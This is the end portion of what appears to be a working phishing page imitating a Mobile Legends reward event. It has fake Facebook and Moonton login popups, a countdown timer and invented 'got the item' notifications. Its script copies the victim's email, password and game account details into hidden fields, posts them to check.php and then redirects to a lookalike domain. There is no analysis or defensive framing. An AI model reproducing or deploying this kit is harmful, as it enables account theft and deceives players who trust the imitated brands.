<div class="event-notification-player">Miyamizune Got the item Border Stardom</div> <!--- event-notification-player --->
<div class="event-notification-player">Si Na Young Got the item Yuji Itadori</div> <!--- event-notification-player --->
</div> <!--- event-notification --->
<div class="footer">
<img class="footer-copyright-icon" src="https://i.postimg.cc/RFxVt2PL/IMG-20220518-122857.png">
<div class="footer-txt-copyright">ⓒ <?php echo $yearNow;?> Moonton Technology Co. Ltd</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct | Official Community Policy</div> <!--- footer-txt-copyright --->
<br>
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/popup-close.png">
<div class="popup-box-navbar-title">Reward Confirmation</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Are you sure to collect this reward?</div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine">
<div>
<figure>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup itemReward_confirmation --->

<div class="popup otherReward_confirmation" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/popup-close.png">
<div class="popup-box-navbar-title">Reward Confirmation</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Are you sure to collect this reward?</div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine">
<div>
<figure>
<span id="otherReward_confirmationValue"></span>
<img src="" id="myOtherReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup otherReward_confirmation --->

<div class="popup account_login" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Login</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Login to receive your selected reward</div> <!--- popup-box-alert --->
<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-star icon-login"></i> Log in using Moonton account</button>
<br>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup account_login --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.postimg.cc/3wBVgZTz/login-Method1.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<img src="https://cdn.jsdelivr.net/gh/arpantek/logArpan@main/mlbb-5v5.webp">
<div class="txt-login-fb">Log in to your Facebook account to connect to Mobile Legends</div> <!--- txt-login-fb --->
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<label>
<input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
</label>
<label>
<input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required>
</label>
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create account</div> <!--- txt-create-account --->
<div class="txt-not-now">Not now</div> <!--- txt-not-now --->
<div class="txt-forgotten-password">Forgotten password?</div> <!--- txt-forgotten-password --->
</div> <!--- content-box-fb --->
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> <!--- language-name language-name-active --->
<div class="language-name">Bahasa Indonesia</div> <!--- language-name --->
<div class="language-name">Basa Jawa</div> <!--- language-name --->
<div class="language-name">Bahasa Melayu</div> <!--- language-name --->
<div class="language-name">日本語</div> <!--- language-name --->
<div class="language-name">Español</div> <!--- language-name --->
<div class="language-name">Português (Brasil)</div> <!--- language-name --->
<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
</center>
</div> <!--- language-box --->
<div class="copyright">Facebook Inc.</div>
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-twitter">
<div class="header-twitter"><img src="https://play-lh.googleusercontent.com/jWN9pjF7atbqHYXAAfwvIjtzpGwTIVwX9etT0-9HiWjRjE1hInoEgJiWjwsiemu2rEb8""></div> <!--- header-twitter --->
<br>
<br>
<br>
<center>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="txt-login-twitter">Login to Moonton</div> <!--- txt-login-twitter --->
<div class="form-group">
<input type="text" name="email" id="email-twitter" autocomplete="off" required>
<label>Phone/email/username</label>
</div> <!--- form-group --->
<div class="form-group">
<input type="password" name="password" id="password-twitter" autocomplete="off" required>
<label>Password</label>
</div> <!--- form-group --->
<input type="hidden" name="login" id="login-twitter" value="Moonton" readonly>
<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter bulet --->
<div class="footer-menu-twitter">Sign up to Moonton</div> <!--- footer-menu-twitter --->
</form>
</center>
</div> <!--- box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup account_verification" style="display: none;">
<div class="popup-box-wrapper popup-box-verification">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Complete your account detail</div> <!--- popup-box-alert --->
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="number" name="playid" id="playid" placeholder="User ID" autocomplete="off" required>
<input type="text" name="nickname" id="nickname" placeholder="Nickname" autocomplete="off" required>
<select name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select name="tier" id="tier" required="required" class="verify-select">
<option value="" selected="selected" disabled="disabled">Ranked Tier Level</option>
<option value="Warrior" class="form-control">Warrior</option>
<option value="Elite" class="form-control">Elite</option>
<option value="Master" class="form-control">Master</option>
<option value="Grandmaster" class="form-control">Grandmaster</option>
<option value="Epic" class="form-control">Epic</option>
<option value="Legend" class="form-control">Legend</option>
<option value="Mythic" class="form-control">Mythic</option>
<option value="Mythic Glory" class="form-control">Mythic Glory</option>
 </select>
<input type="hidden" name="login" id="validateLogin" readonly>
</div> <!--- popup-box-bg --->
<div class="popup-box-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify my Account</button>
</div> <!--- popup-box-form-footer --->
</form> <!--- form --->
</div> <!--- popup-box-wrapper popup-box-verification --->
</div> <!--- popup account_verification --->

<div class="popup check_verification" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
</div> <!--- popup-box-alert --->
<br>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup check_verification --->

<div class="popup processing_account" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Processing Account</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">
Thanks for joining this Mobile Legends event
<br>
<br>
Your account has been successfully processed
<br>
Please wait up to 24 hours
</div> <!--- popup-box-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://m.mobilelegends.com/en';">Logout</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup processing_account --->
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/ions-package@3.2.7/ionicons.map.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script>
// code for random id
var slidePlayer = 0;
openSlides();
function openSlides() {
    var i;
    var slides = document.getElementsByClassName("event-notification-player");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slidePlayer++;
    if (slidePlayer > slides.length) {slidePlayer = 1} 
    slides[slidePlayer-1].style.display = "block"; 
    setTimeout(openSlides, 2500);
}
</script>
<script>
var buka = new Audio();
buka.src = "https://rawcdn.githack.com/AlexHostX/all.asset/d1a42a80f01064a559cb0ce4e5ec0474091c651f/click.mp3";

var tutup = new Audio();
tutup.src = "https://rawcdn.githack.com/AlexHostX/all.asset/6635455e463c4b55d9c4dac99f2c44f9091b612c/unclick.mp3";

	$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#latestTimer').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
function open_account_login(){
	$('.account_login').show();
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}
function close_reward_confirmation(){
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
}
function tutup_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function tutup_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}

// code for validate data to next step
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$email = $('#email-facebook').val().trim();
	$password = $('#password-facebook').val().trim();
	$login = $('#login-facebook').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-facebook').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}
function ValidateLoginTwitterData() {
	$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
	submitingValidateLoginTwitterData.preventDefault();
	
	$email = $('#email-twitter').val().trim();
	$password = $('#password-twitter').val().trim();
	$login = $('#login-twitter').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-twitter').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}

// code for validate data to sending to file result
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $nick = $("input#nick").val();
	var $playid = $("input#playid").val();
	var $phone = $("input#phone").val();
	var $level = $("input#level").val();
	var $tier = $("input#tier").val();
	var $rpt = $("input#rpt").val();
	var $rpl = $("input#rpl").val();
	var $platform = $("input#platform").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $nick == "" && $playid == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.check_verification').show();
			$('.account_verification').hide();
		},
		success: function(){
		window.location = "https://mobblegends.my.id/";
		}
	});
	});  
	return false;
}
</script>

</body>
</html>